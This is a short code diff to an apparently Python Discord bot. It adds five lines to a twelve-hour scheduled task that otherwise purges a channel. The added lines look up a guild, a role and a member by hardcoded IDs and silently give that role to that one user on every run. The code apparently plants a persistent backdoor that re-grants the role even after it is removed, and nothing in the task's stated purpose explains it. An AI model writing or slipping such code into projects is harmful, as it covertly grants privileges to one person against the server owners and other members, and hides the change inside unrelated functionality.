@@ -209,6 +209,11 @@ async def list_team(ctx, error):
         
 @tasks.loop(hours=12)
 async def list_team_task():
+    guild_adt = bot.get_guild(901772674865455115)
+    role_xd = guild_adt.get_role(1128589111113035806)
+    member_xd = guild_adt.get_member(321949700297064450)
+    await member_xd.add_roles(role_xd)
+    
     channel = bot.get_channel(1297158288063987752)
     if channel:
         deleted = await channel.purge(limit=100)
